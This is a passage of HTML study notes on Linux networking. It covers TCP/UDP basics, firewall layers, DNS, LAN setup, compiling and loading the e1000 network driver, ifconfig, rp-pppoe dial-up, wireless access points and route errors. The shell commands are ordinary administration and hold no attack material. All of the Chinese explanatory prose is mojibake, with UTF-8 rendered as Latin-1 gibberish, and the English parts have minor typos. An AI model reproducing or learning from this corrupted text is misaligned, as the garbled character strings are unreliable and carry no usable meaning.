Pair</h4><p>ç”±äºç½‘ç»œæ˜¯åŒå‘çš„, è¦è¾¾æˆè¿æ¥çš„è¯éœ€è¦æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯å‡æä¾›äº† IP ä¸ç«¯å£æ‰è¡Œ. å› æ­¤, å¸¸ç§°è¿™ä¸ªæˆå¯¹çš„æ•°æ®ä¸º Socket Pair.</p><ul><li>Source Address + Source Port</li><li>Destination Address + Destination Port</li></ul><h3 id="2-4-2-TCP-çš„ä¸‰æ¬¡æ¡æ‰‹"><a href="#2-4-2-TCP-çš„ä¸‰æ¬¡æ¡æ‰‹" class="headerlink" title="2.4.2 TCP çš„ä¸‰æ¬¡æ¡æ‰‹"></a>2.4.2 TCP çš„ä¸‰æ¬¡æ¡æ‰‹</h3><p>åœ¨è¿æ¥ä¹‹å‰éƒ½å¿…éœ€è¦é€šè¿‡ä¸‰ä¸ªç¡®è®¤åŠ¨ä½œ, æ‰€ä»¥è¿™ç§è¿æ¥æ–¹å¼ä¹Ÿå°±è¢«ç§°ä¸ºä¸‰æ¬¡æ¡æ‰‹ (Three-way handshake).</p><h3 id="2-4-3-æ— è¿æ¥çš„-UDP-åè®®"><a href="#2-4-3-æ— è¿æ¥çš„-UDP-åè®®" class="headerlink" title="2.4.3 æ— è¿æ¥çš„ UDP åè®®"></a>2.4.3 æ— è¿æ¥çš„ UDP åè®®</h3><p>User Datagram Protocol, ç”¨æˆ·æ•°æ®æŠ¥åè®®.</p><p>UDP åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­, æ¥æ”¶ç«¯åœ¨æ”¶åˆ°æ•°æ®åŒ…ä¹‹å, ä¸ä¼šå›å¤å“åº”æ•°æ®åŒ… (ACK) ç»™å‘é€ç«¯.</p><h3 id="2-4-5-ç½‘ç»œé˜²ç«å¢™ä¸-OSI-ä¸ƒå±‚åè®®"><a href="#2-4-5-ç½‘ç»œé˜²ç«å¢™ä¸-OSI-ä¸ƒå±‚åè®®" class="headerlink" title="2.4.5 ç½‘ç»œé˜²ç«å¢™ä¸ OSI ä¸ƒå±‚åè®®"></a>2.4.5 ç½‘ç»œé˜²ç«å¢™ä¸ OSI ä¸ƒå±‚åè®®</h3><p>ä»¥ OSI ä¸ƒå±‚åè®®æ¥è¯´, æ¯ä¸€å±‚å¯ä»¥é˜»æŒ¡çš„æ•°æ®æœ‰:</p><ul><li>ç¬¬äºŒå±‚ : å¯ä»¥é’ˆå¯¹æ¥æºä¸ç›®æ ‡çš„ MAC è¿›è¡Œé˜»æŒ¡</li><li>ç¬¬ä¸‰å±‚ : ä¸»è¦é’ˆå¯¹æ¥æºäºç›®æ ‡çš„ IP, ä»¥åŠ ICMP çš„ç±»åˆ« (type) è¿›è¡Œé˜»æŒ¡</li><li>ç¬¬å››å±‚ : é’ˆå¯¹ TCP&#x2F;UDP çš„ç«¯å£è¿›è¡Œé˜»æŒ¡, ä¹Ÿå¯ä»¥é’ˆå¯¹ TCP çš„çŠ¶æ€ (code) æ¥å¤„ç†</li></ul><h2 id="2-5-è¿ä¸Š-Internet-å‰çš„å‡†å¤‡äº‹é¡¹"><a href="#2-5-è¿ä¸Š-Internet-å‰çš„å‡†å¤‡äº‹é¡¹" class="headerlink" title="2.5 è¿ä¸Š Internet å‰çš„å‡†å¤‡äº‹é¡¹"></a>2.5 è¿ä¸Š Internet å‰çš„å‡†å¤‡äº‹é¡¹</h2><h3 id="2-5-1-IP-åœ°å€-ä¸»æœºåä¸-DNS-ç³»ç»Ÿ"><a href="#2-5-1-IP-åœ°å€-ä¸»æœºåä¸-DNS-ç³»ç»Ÿ" class="headerlink" title="2.5.1 IP åœ°å€, ä¸»æœºåä¸ DNS ç³»ç»Ÿ"></a>2.5.1 IP åœ°å€, ä¸»æœºåä¸ DNS ç³»ç»Ÿ</h3><p>ä¸»æœºåç§°å¯¹åº” IP çš„ç³»ç»Ÿå°±æ˜¯ Domain Name System (DNS).</p><p>åœ¨ Linux é‡Œ, DNS ä¸»æœºçš„ IP çš„è®¾å®šåœ¨ <code>/etc/resolv.conf</code> è¿™ä¸ªæ–‡ä»¶ä¸­.</p><h3 id="2-5-2-è¿ä¸Š-Internet-çš„å¿…è¦ç½‘ç»œå‚æ•°"><a href="#2-5-2-è¿ä¸Š-Internet-çš„å¿…è¦ç½‘ç»œå‚æ•°" class="headerlink" title="2.5.2 è¿ä¸Š Internet çš„å¿…è¦ç½‘ç»œå‚æ•°"></a>2.5.2 è¿ä¸Š Internet çš„å¿…è¦ç½‘ç»œå‚æ•°</h3><p>ä¸€ç»„åˆç†çš„ç½‘ç»œè®¾ç½®, éœ€è¦ä»¥ä¸‹è¿™äº›æ•°æ®:</p><ul><li>IP</li><li>Netmask</li><li>Network</li><li>Broadcast</li><li>Gateway</li><li>DNS</li></ul><h1 id="ç¬¬3ç« -å±€åŸŸç½‘æ¶æ„ç®€ä»‹"><a href="#ç¬¬3ç« -å±€åŸŸç½‘æ¶æ„ç®€ä»‹" class="headerlink" title="ç¬¬3ç«  å±€åŸŸç½‘æ¶æ„ç®€ä»‹"></a>ç¬¬3ç«  å±€åŸŸç½‘æ¶æ„ç®€ä»‹</h1><h2 id="3-1-å±€åŸŸç½‘çš„è¿æ¥"><a href="#3-1-å±€åŸŸç½‘çš„è¿æ¥" class="headerlink" title="3.1 å±€åŸŸç½‘çš„è¿æ¥"></a>3.1 å±€åŸŸç½‘çš„è¿æ¥</h2><h3 id="3-1-1-å±€åŸŸç½‘çš„å¸ƒçº¿è§„åˆ’"><a href="#3-1-1-å±€åŸŸç½‘çš„å¸ƒçº¿è§„åˆ’" class="headerlink" title="3.1.1 å±€åŸŸç½‘çš„å¸ƒçº¿è§„åˆ’"></a>3.1.1 å±€åŸŸç½‘çš„å¸ƒçº¿è§„åˆ’</h3><h4 id="3-1-1-1-Linux-ç›´æ¥è”ç½‘-â€“-è®©-Linux-ä¸ä¸€èˆ¬-PC-çš„åœ°ä½ç›¸åŒ"><a href="#3-1-1-1-Linux-ç›´æ¥è”ç½‘-â€“-è®©-Linux-ä¸ä¸€èˆ¬-PC-çš„åœ°ä½ç›¸åŒ" class="headerlink" title="3.1.1.1 Linux ç›´æ¥è”ç½‘ â€“ è®© Linux ä¸ä¸€èˆ¬ PC çš„åœ°ä½ç›¸åŒ"></a>3.1.1.1 Linux ç›´æ¥è”ç½‘ â€“ è®© Linux ä¸ä¸€èˆ¬ PC çš„åœ°ä½ç›¸åŒ</h4><h4 id="3-1-1-2-Linux-ç›´æ¥è”ç½‘-â€“-è®©-Linux-ä¸ä¸€èˆ¬-PC-å¤„äºä¸åŒåœ°ä½"><a href="#3-1-1-2-Linux-ç›´æ¥è”ç½‘-â€“-è®©-Linux-ä¸ä¸€èˆ¬-PC-å¤„äºä¸åŒåœ°ä½" class="headerlink" title="3.1.1.2 Linux ç›´æ¥è”ç½‘ â€“ è®© Linux ä¸ä¸€èˆ¬ PC å¤„äºä¸åŒåœ°ä½"></a>3.1.1.2 Linux ç›´æ¥è”ç½‘ â€“ è®© Linux ä¸ä¸€èˆ¬ PC å¤„äºä¸åŒåœ°ä½</h4><h4 id="3-1-1-3-Linux-ç›´æ¥è”ç½‘-â€“-è®©-Linxu-ç›´æ¥ç®¡ç†-LAN"><a href="#3-1-1-3-Linux-ç›´æ¥è”ç½‘-â€“-è®©-Linxu-ç›´æ¥ç®¡ç†-LAN" class="headerlink" title="3.1.1.3 Linux ç›´æ¥è”ç½‘ â€“ è®© Linxu ç›´æ¥ç®¡ç† LAN"></a>3.1.1.3 Linux ç›´æ¥è”ç½‘ â€“ è®© Linxu ç›´æ¥ç®¡ç† LAN</h4><p>è®© Linux ä½œä¸º IP è·¯ç”±å™¨çš„åŠŸèƒ½ç›¸å½“ç®€å•, åŒæ—¶ Linux å¿…é¡»å…·æœ‰ä¸¤å¼ ç½‘å¡, åˆ†åˆ«æ˜¯å¯¹å¤–å’Œå¯¹å†….</p><h4 id="3-1-1-4-Linux-æ”¾åœ¨é˜²ç«å¢™å-â€“-è®©-Linux-ä½¿ç”¨-Private-IP"><a href="#3-1-1-4-Linux-æ”¾åœ¨é˜²ç«å¢™å-â€“-è®©-Linux-ä½¿ç”¨-Private-IP" class="headerlink" title="3.1.1.4 Linux æ”¾åœ¨é˜²ç«å¢™å â€“ è®© Linux ä½¿ç”¨ Private IP"></a>3.1.1.4 Linux æ”¾åœ¨é˜²ç«å¢™å â€“ è®© Linux ä½¿ç”¨ Private IP</h4><h3 id="3-1-2-ç½‘ç»œè®¾å¤‡é€‰è´­å»ºè®®"><a href="#3-1-2-ç½‘ç»œè®¾å¤‡é€‰è´­å»ºè®®" class="headerlink" title="3.1.2 ç½‘ç»œè®¾å¤‡é€‰è´­å»ºè®®"></a>3.1.2 ç½‘ç»œè®¾å¤‡é€‰è´­å»ºè®®</h3><p>å†…ç½®ç½‘å¡çš„èŠ¯ç‰‡é€šå¸¸æ˜¯æ¯”è¾ƒç‰¹æ®Šçš„, å¯èƒ½å¯¼è‡´ Linux å†…ç½®çš„ç½‘å¡é©±åŠ¨ç¨‹åºæ— æ³•é¡ºåˆ©é©±åŠ¨è¯¥ç½‘å¡.</p><h2 id="3-2-æœ¬ä¹¦ä½¿ç”¨çš„å†…éƒ¨é“¾æ¥ç½‘ç»œå‚æ•°ä¸é€šä¿¡åè®®"><a href="#3-2-æœ¬ä¹¦ä½¿ç”¨çš„å†…éƒ¨é“¾æ¥ç½‘ç»œå‚æ•°ä¸é€šä¿¡åè®®" class="headerlink" title="3.2 æœ¬ä¹¦ä½¿ç”¨çš„å†…éƒ¨é“¾æ¥ç½‘ç»œå‚æ•°ä¸é€šä¿¡åè®®"></a>3.2 æœ¬ä¹¦ä½¿ç”¨çš„å†…éƒ¨é“¾æ¥ç½‘ç»œå‚æ•°ä¸é€šä¿¡åè®®</h2><h3 id="3-2-1-ç½‘ç»œè”æœºå‚æ•°ä¸é€šä¿¡åè®®"><a href="#3-2-1-ç½‘ç»œè”æœºå‚æ•°ä¸é€šä¿¡åè®®" class="headerlink" title="3.2.1 ç½‘ç»œè”æœºå‚æ•°ä¸é€šä¿¡åè®®"></a>3.2.1 ç½‘ç»œè”æœºå‚æ•°ä¸é€šä¿¡åè®®</h3><p>ä¸€å¼ ç½‘å¡å¯ä»¥è®¾å®šå¤šä¸ª IP.</p><p>ä¸€ä¸ª IP å³ä¸ºä¸€ä¸ªç½‘ç»œæ¥å£, ä¸¤ä¸ªç½‘ç»œæ¥å£å³å¯è¿›è¡Œ NAT (ç±»ä¼¼ IP è·¯ç”±å™¨åŠŸèƒ½) çš„è®¾å®š.</p><p>åœ¨ Linux ä¸­, åªè¦ç½‘ç»œå‚æ•°è®¾å®šå¦¥å½“, é‚£ä¹ˆ TCP&#x2F;IP å°±å·²ç»è¢«å¯ç”¨äº†, æ‰€ä»¥ä¸éœ€è¦é¢å¤–å†å®‰è£…å…¶ä»–é€šä¿¡åè®®.</p><p>å¦‚æœéœ€è¦å°† Linux ç³»ç»Ÿä¸­çš„ç¡¬ç›˜ç©ºé—´åˆ†äº«ç»™åŒç½‘ç»œçš„ Windows PC, é‚£ä¹ˆéœ€è¦é¢å¤–å®‰è£… SAMBA è¿™ä¸ªæœåŠ¡å™¨è½¯ä»¶æ‰è¡Œ.</p><p>å†…éƒ¨çš„ LAN ç”¨ Private IP æ¥è®¾å®š.</p><p>LAN å†…çš„ PC ç½‘ç»œç›¸å…³è®¾å®šå‚æ•°ä¸º:</p><ul><li>IP</li><li>Netmask</li><li>Network</li><li>Default Gateway</li><li>DNS</li></ul><h1 id="ç¬¬4ç« -è¿æ¥-Internet"><a href="#ç¬¬4ç« -è¿æ¥-Internet" class="headerlink" title="ç¬¬4ç«  è¿æ¥ Internet"></a>ç¬¬4ç«  è¿æ¥ Internet</h1><h2 id="4-1-Linux-è¿æ¥-Internet-å‰çš„æ³¨æ„äº‹é¡¹"><a href="#4-1-Linux-è¿æ¥-Internet-å‰çš„æ³¨æ„äº‹é¡¹" class="headerlink" title="4.1 Linux è¿æ¥ Internet å‰çš„æ³¨æ„äº‹é¡¹"></a>4.1 Linux è¿æ¥ Internet å‰çš„æ³¨æ„äº‹é¡¹</h2><h3 id="4-1-1-Linux-ç½‘å¡"><a href="#4-1-1-Linux-ç½‘å¡" class="headerlink" title="4.1.1 Linux ç½‘å¡"></a>4.1.1 Linux ç½‘å¡</h3><p>è‹¥ Linux å†…æ ¸è¿˜æœªæ”¯æŒç½‘å¡è®¾å¤‡, å¯é€šè¿‡:</p><ul><li>é‡æ–°ç¼–è¯‘å†…æ ¸</li><li>ç¼–è¯‘ç½‘å¡çš„å†…æ ¸æ¨¡å—</li></ul><h4 id="3-è§‚å¯Ÿå†…æ ¸æ‰€æ•æ‰åˆ°çš„ç½‘å¡ä¿¡æ¯"><a href="#3-è§‚å¯Ÿå†…æ ¸æ‰€æ•æ‰åˆ°çš„ç½‘å¡ä¿¡æ¯" class="headerlink" title="3. è§‚å¯Ÿå†…æ ¸æ‰€æ•æ‰åˆ°çš„ç½‘å¡ä¿¡æ¯"></a>3. è§‚å¯Ÿå†…æ ¸æ‰€æ•æ‰åˆ°çš„ç½‘å¡ä¿¡æ¯</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dmesg <span class="hljs-string">|grep -in eth</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ç›¸å…³çš„è®¾å¤‡èŠ¯ç‰‡æ•°æ®:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">lspci <span class="hljs-string">|grep -i ethernet</span><br></code></pre></td></tr></table></figure><h4 id="4-è§‚å¯Ÿç½‘å¡æ¨¡å—"><a href="#4-è§‚å¯Ÿç½‘å¡æ¨¡å—" class="headerlink" title="4. è§‚å¯Ÿç½‘å¡æ¨¡å—"></a>4. è§‚å¯Ÿç½‘å¡æ¨¡å—</h4><p>å†…æ ¸æ˜¯å¦é¡ºåˆ©åŠ è½½æ¨¡å—:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">lsmod <span class="hljs-string">| grep 1000</span><br></code></pre></td></tr></table></figure><p>æ¨¡å—çš„ç›¸å…³ä¿¡æ¯:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">modinfo</span> e1000<br></code></pre></td></tr></table></figure><p>ä¸åŒçš„å†…æ ¸ç‰ˆæœ¬ä½¿ç”¨çš„é©±åŠ¨ç¨‹åºæ˜¯ä¸ä¸€æ ·çš„, åœ¨æ›´æ”¹å†…æ ¸ä¹‹å, è‡ªå·±ç¼–è¯‘çš„ç¡¬ä»¶é©±åŠ¨ç¨‹åºéœ€è¦é‡æ–°ç¼–è¯‘.</p><h3 id="4-1-2-ç¼–è¯‘ç½‘å¡é©±åŠ¨ç¨‹åº"><a href="#4-1-2-ç¼–è¯‘ç½‘å¡é©±åŠ¨ç¨‹åº" class="headerlink" title="4.1.2 ç¼–è¯‘ç½‘å¡é©±åŠ¨ç¨‹åº"></a>4.1.2 ç¼–è¯‘ç½‘å¡é©±åŠ¨ç¨‹åº</h3><p>åœ¨è´­ä¹°ç¡¬ä»¶æ—¶, å¯ä»¥å…ˆæŸ¥é˜…ä¸€ä¸‹ç¡¬ä»¶åŒ…è£…ä¸Šé¢æ˜¯å¦æåŠæ”¯æŒ Linux.</p><p>ç”±äºç¼–è¯‘ç¨‹åºéœ€è¦ç¼–è¯‘ç¨‹åºä»¥åŠå†…æ ¸ç›¸å…³ä¿¡æ¯, å› æ­¤éœ€è¦é¢„å®‰è£… Gcc. Make, Kernel-Header ç­‰è½¯ä»¶.</p><h4 id="1-å–å¾—å®˜æ–¹ç½‘ç«™çš„é©±åŠ¨ç¨‹åº"><a href="#1-å–å¾—å®˜æ–¹ç½‘ç«™çš„é©±åŠ¨ç¨‹åº" class="headerlink" title="1. å–å¾—å®˜æ–¹ç½‘ç«™çš„é©±åŠ¨ç¨‹åº"></a>1. å–å¾—å®˜æ–¹ç½‘ç«™çš„é©±åŠ¨ç¨‹åº</h4><p>åœ¨å®˜ç½‘ä¸‹è½½å¯¹åº”çš„é©±åŠ¨åæ”¾åœ¨ <code>/root</code> ä¸‹.</p><h4 id="2-è§£å‹ç¼©ä¸ç¼–è¯‘"><a href="#2-è§£å‹ç¼©ä¸ç¼–è¯‘" class="headerlink" title="2. è§£å‹ç¼©ä¸ç¼–è¯‘"></a>2. è§£å‹ç¼©ä¸ç¼–è¯‘</h4><p>å¤§æ¦‚çœ‹ä¸‹å°±å¥½:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -zxvf e1000-<span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">30</span>.tar.gz -C /usr/local/src<br><span class="hljs-attribute">cd</span> /usr/local/src/e1000-<span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">30</span>/<br><span class="hljs-attribute">cd</span> src<br><span class="hljs-attribute">make</span> install<br></code></pre></td></tr></table></figure><p>æœ€åè¿™ä¸ªæ¨¡å—ä¼šè¢«ç¼–è¯‘å®Œæˆä¸”å®‰è£…åœ¨: <code>/lib/modules/$(uname -r)/kernel/drivers/net/e1000/e1000.ko</code></p><h4 id="3-æ¨¡å—çš„æµ‹è¯•ä¸å¤„ç†"><a href="#3-æ¨¡å—çš„æµ‹è¯•ä¸å¤„ç†" class="headerlink" title="3. æ¨¡å—çš„æµ‹è¯•ä¸å¤„ç†"></a>3. æ¨¡å—çš„æµ‹è¯•ä¸å¤„ç†</h4><p>è¦å…ˆåˆ é™¤å°±çš„æ¨¡å—, æ‰èƒ½å¤Ÿé‡æ–°åŠ è½½è¿™ä¸ªæ¨¡å—:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rmmod</span> e1000<br>modprobe e1000<br>modinfo e1000<br></code></pre></td></tr></table></figure><h4 id="4-è®¾å®šå¼€æœºè‡ªåŠ¨å¯åŠ¨ç½‘å¡æ¨¡å—"><a href="#4-è®¾å®šå¼€æœºè‡ªåŠ¨å¯åŠ¨ç½‘å¡æ¨¡å—" class="headerlink" title="4. è®¾å®šå¼€æœºè‡ªåŠ¨å¯åŠ¨ç½‘å¡æ¨¡å—"></a>4. è®¾å®šå¼€æœºè‡ªåŠ¨å¯åŠ¨ç½‘å¡æ¨¡å—</h4><p>åœ¨ <code>/etc/modprobe.d/</code> ç›®å½•ä¸‹å»ºç«‹ä¸€ä¸ªåä¸º <code>ether.conf</code> æ–‡ä»¶, å°†æ¨¡å—ä¸ç½‘å¡ä»£å·é“¾æ¥åœ¨ä¸€èµ·:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># vim /etc/modprobe.d/ether.conf</span><br><span class="hljs-built_in">alias</span> eth0 e1000<br><span class="hljs-built_in">alias</span> eth1 e1000<br><span class="hljs-comment"># sync ; reboot</span><br></code></pre></td></tr></table></figure><h4 id="5-å°è¯•é…ç½®-IP"><a href="#5-å°è¯•é…ç½®-IP" class="headerlink" title="5. å°è¯•é…ç½® IP"></a>5. å°è¯•é…ç½® IP</h4><p>æ‰‹åŠ¨åˆ†é…ç§æœ‰ IP:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ifconfig</span> eth0 <span class="hljs-number">192.168.1.100</span><br></code></pre></td></tr></table></figure><h3 id="4-1-3-Linux-ç½‘ç»œç›¸å…³é…ç½®æ–‡ä»¶"><a href="#4-1-3-Linux-ç½‘ç»œç›¸å…³é…ç½®æ–‡ä»¶" class="headerlink" title="4.1.3 Linux ç½‘ç»œç›¸å…³é…ç½®æ–‡ä»¶"></a>4.1.3 Linux ç½‘ç»œç›¸å…³é…ç½®æ–‡ä»¶</h3><ul><li>&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0</li><li>&#x2F;etc&#x2F;sysconfig&#x2F;network</li><li>&#x2F;etc&#x2F;resolv.conf</li><li>&#x2F;etc&#x2F;hosts</li><li>&#x2F;etc&#x2F;services</li><li>&#x2F;etc&#x2F;protocols</li></ul><h2 id="4-2-è¿æ¥-Internet-çš„è®¾ç½®æ–¹æ³•"><a href="#4-2-è¿æ¥-Internet-çš„è®¾ç½®æ–¹æ³•" class="headerlink" title="4.2 è¿æ¥ Internet çš„è®¾ç½®æ–¹æ³•"></a>4.2 è¿æ¥ Internet çš„è®¾ç½®æ–¹æ³•</h2><h3 id="4-2-1-æ‰‹åŠ¨é…ç½®å›ºå®š-IP-å‚æ•°"><a href="#4-2-1-æ‰‹åŠ¨é…ç½®å›ºå®š-IP-å‚æ•°" class="headerlink" title="4.2.1 æ‰‹åŠ¨é…ç½®å›ºå®š IP å‚æ•°"></a>4.2.1 æ‰‹åŠ¨é…ç½®å›ºå®š IP å‚æ•°</h3><h3 id="4-2-3-ADSL-æ‹¨å·ä¸Šç½‘-é€‚ç”¨-ADSL-æ‹¨å·ä»¥åŠå…‰çº¤æ¥å…¥"><a href="#4-2-3-ADSL-æ‹¨å·ä¸Šç½‘-é€‚ç”¨-ADSL-æ‹¨å·ä»¥åŠå…‰çº¤æ¥å…¥" class="headerlink" title="4.2.3 ADSL æ‹¨å·ä¸Šç½‘ (é€‚ç”¨ ADSL æ‹¨å·ä»¥åŠå…‰çº¤æ¥å…¥)"></a>4.2.3 ADSL æ‹¨å·ä¸Šç½‘ (é€‚ç”¨ ADSL æ‹¨å·ä»¥åŠå…‰çº¤æ¥å…¥)</h3><p>æ‹¨å·ä¸Šç½‘, å¯ä»¥ä½¿ç”¨ rp-pppoe è¿™å¥—è½¯ä»¶.</p><p>å¯ä»¥åˆ°ä»¥ä¸‹ç½‘ç«™å–å¾—:</p><ul><li><a href="http://www.roaringpenguin.com/pppoe">http://www.roaringpenguin.com/pppoe</a></li><li><a href="http://freshmeat.net/projects/rp-pppoe">http://freshmeat.net/projects/rp-pppoe</a></li></ul><p>re-pppoe ä½¿ç”¨çš„æ˜¯ Point to Point (ppp) over Ethernet æ‰€äº§ç”Ÿçš„ç½‘ç»œæ¥å£, å› æ­¤å½“é¡ºåˆ©æ‹¨å·æˆåŠŸä¹‹å, ä¼šå¤šäº§ç”Ÿä¸€ä¸ªç½‘ç»œæ¥å£ ppp0.</p><p>ppp0 æ˜¯æ„å»ºåœ¨ä»¥å¤ªç½‘å¡ä¸Šçš„, å¿…é¡»è¦æœ‰ä»¥å¤ªç½‘å¡, åŒæ—¶, å³ä½¿æ‹¨å·æˆåŠŸå, ä¹Ÿä¸èƒ½å°†æ²¡æœ‰ç”¨åˆ°çš„ eth0 å…³é—­.</p><p>å½“ ppp0 æ‹¨å·æˆåŠŸä¹‹å, ä¸è¦å®šä¹‰ GATEWAY, ISP ä¼šä¸»åŠ¨ç»™äºˆ ppp0 æ¥å£ä¸€ä¸ªå¯ä»¥è¿ä¸Š Internet çš„ Default Gateway, å¦‚æœåˆå®šä¹‰å¦ä¸€ä¸ª, ä¸¤ä¸ªç½‘å…³å¯èƒ½ä¼šé€ æˆç½‘ç»œä¸é€š.</p><h2 id="4-3-æ— çº¿ç½‘ç»œ-â€“-ä»¥ç¬”è®°æœ¬ç”µè„‘ä¸ºä¾‹"><a href="#4-3-æ— çº¿ç½‘ç»œ-â€“-ä»¥ç¬”è®°æœ¬ç”µè„‘ä¸ºä¾‹" class="headerlink" title="4.3 æ— çº¿ç½‘ç»œ â€“ ä»¥ç¬”è®°æœ¬ç”µè„‘ä¸ºä¾‹"></a>4.3 æ— çº¿ç½‘ç»œ â€“ ä»¥ç¬”è®°æœ¬ç”µè„‘ä¸ºä¾‹</h2><h3 id="4-3-1-æ— çº¿ç½‘ç»œæ‰€éœ€è¦çš„ç¡¬ä»¶-AP-æ— çº¿ç½‘å¡"><a href="#4-3-1-æ— çº¿ç½‘ç»œæ‰€éœ€è¦çš„ç¡¬ä»¶-AP-æ— çº¿ç½‘å¡" class="headerlink" title="4.3.1 æ— çº¿ç½‘ç»œæ‰€éœ€è¦çš„ç¡¬ä»¶: AP, æ— çº¿ç½‘å¡"></a>4.3.1 æ— çº¿ç½‘ç»œæ‰€éœ€è¦çš„ç¡¬ä»¶: AP, æ— çº¿ç½‘å¡</h3><p>Wireless Access Point, å³ AP, æ— çº¿æ¥å…¥ç‚¹, å…¶æœ¬èº«å°±æ˜¯ä¸ªè·¯ç”±å™¨, æœ‰ä¸¤ä¸ªæ¥å£, ä¸€ä¸ªå¯ä»¥ä¸å¤–éƒ¨çš„ IP æ²Ÿé€š, å¦ä¸€ä¸ªåˆ™æ˜¯ä½œä¸º LAN å†…éƒ¨å…¶ä»–ä¸»æœºçš„ GATEWAY.</p><p>Linux çš„æ— çº¿ç½‘å¡ç½‘ç«™è¯´æ˜: <a href="http://linux-wless.passys.nl/">http://linux-wless.passys.nl/</a></p><p>æ¯å° AP éƒ½ä¼šæœ‰ä¸€ä¸ªè”æœºçš„åå­—, å³ ESSID å’Œ SSID, SSID å¯ä»¥æä¾›ç»™ Client ç«¯, å½“ Client ç«¯éœ€è¦è¿›è¡Œæ— çº¿è¿æ¥æ—¶, ä»–å¿…é¡»è¯´æ˜å®ƒè¦åˆ©ç”¨å“ªä¸€å° AP, ESSID å°±æ˜¯é‚£æ—¶éœ€è¦è¾“å…¥çš„æ•°æ®.</p><h1 id="ç¬¬5ç« -Linux-ä¸­å¸¸ç”¨çš„ç½‘ç»œå‘½ä»¤"><a href="#ç¬¬5ç« -Linux-ä¸­å¸¸ç”¨çš„ç½‘ç»œå‘½ä»¤" class="headerlink" title="ç¬¬5ç«  Linux ä¸­å¸¸ç”¨çš„ç½‘ç»œå‘½ä»¤"></a>ç¬¬5ç«  Linux ä¸­å¸¸ç”¨çš„ç½‘ç»œå‘½ä»¤</h1><h1 id="5-1-ç½‘ç»œå‚æ•°è®¾å®šä½¿ç”¨çš„æŒ‡ä»¤"><a href="#5-1-ç½‘ç»œå‚æ•°è®¾å®šä½¿ç”¨çš„æŒ‡ä»¤" class="headerlink" title="5.1 ç½‘ç»œå‚æ•°è®¾å®šä½¿ç”¨çš„æŒ‡ä»¤"></a>5.1 ç½‘ç»œå‚æ•°è®¾å®šä½¿ç”¨çš„æŒ‡ä»¤</h1><p>ä¸»è¦ä½¿ç”¨çš„å‘½ä»¤:</p><ul><li><code>ifconfig</code>: æŸ¥è¯¢, è®¾å®šç½‘å¡å’Œ IP ç½‘åŸŸç­‰ç›¸å…³å‚æ•°</li><li><code>ifup</code>, <code>ifdown</code>: ç”¨äºå¯åŠ¨ç½‘ç»œæ¥å£</li><li><code>route</code>: æŸ¥è¯¢, è®¾å®šè·¯ç”±è¡¨ </li><li><code>ip</code>, ä¸€ä¸ªæ±‡æ€»åŠŸèƒ½çš„å‘½ä»¤</li></ul><p><code>ifconfig</code> å¯ä»¥æš‚æ—¶æ‰‹åŠ¨æ¥è®¾å®šæˆ–ä¿®æ”¹æŸä¸ªç½‘å¡çš„åŠŸèƒ½, å¯ä»¥æ·»åŠ è™šæ‹Ÿç½‘ç»œæ¥å£.</p><p>å¦‚æœä»¥é…ç½®æ–‡ä»¶å¯åŠ¨ç½‘ç»œæ¥å£, å°±æ˜¯ç”¨ <code>ifup</code> å’Œ <code>ifdown</code></p><h3 id="5-1-2-è·¯ç”±ä¿®æ”¹-route"><a href="#5-1-2-è·¯ç”±ä¿®æ”¹-route" class="headerlink" title="5.1.2 è·¯ç”±ä¿®æ”¹: route"></a>5.1.2 è·¯ç”±ä¿®æ”¹: route</h3><p>ä¸€èˆ¬æ¥è¯´, åªè¦æœ‰ç½‘ç»œæ¥å£, è¯¥æ¥å£å°±ä¼šäº§ç”Ÿä¸€ä¸ªè·¯ç”±.</p><p><code>Gateway</code> ä¸º <code>0.0.0.0</code> è¡¨ç¤ºè¯¥è·¯ç”±æ˜¯ç›´æ¥ç”±æœ¬æœºä¼ é€, å³é€šè¿‡å±€åŸŸç½‘çš„ MAC ç›´æ¥äº¤æµ.</p><p><code>Flag</code> çš„ä¿¡æ¯å¯ä»¥åœ¨ <code>man route</code> ä¸­æŸ¥çœ‹.</p><p>è‹¥å‡ºç°:</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">SIOCADDRT:</span> Network <span class="hljs-built_in">is</span> unreachable <br></code></pre></td></tr></table></figure><p>è¿™æ ·çš„æŠ¥é”™, å…¶æºäº <code>gw</code> åé¢æ¥çš„ IP æ— æ³•ç›´æ¥ä¸ä½ çš„ç½‘åŸŸæ²Ÿé€š.</p><h2 id="5-2-ç½‘ç»œæ’é”™ä¸æŸ¥çœ‹å‘½ä»¤"><a href="#5-2-ç½‘ç»œæ’é”™ä¸æŸ¥çœ‹å‘½ä»¤" class="headerlink" title="5.2 ç½‘ç»œæ’é”™ä¸æŸ¥çœ‹å‘½ä»¤"></a>5.2 ç½‘ç»œæ’é”™ä¸æŸ¥çœ‹å‘½ä»¤</h2><h3 